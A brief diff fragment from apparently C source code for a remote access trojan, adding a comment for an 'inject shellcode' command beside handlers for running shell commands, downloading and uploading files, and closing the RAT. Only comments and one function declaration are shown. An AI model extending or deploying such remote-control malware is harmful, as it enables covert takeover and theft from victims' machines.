@@ -19,6 +19,7 @@ void enter_cmd_loop(IN SOCKET *s);
     *    impl_EXEC:    execute shell commands
     *    impl_GET:     download file
     *    impl_PUT:     upload file
+    *    impl_INJECT   inject shellcode
     *    impl_EXIT:    close RAT
 */
 BOOL impl_EXEC(IN SOCKET *s, IN const char *params);
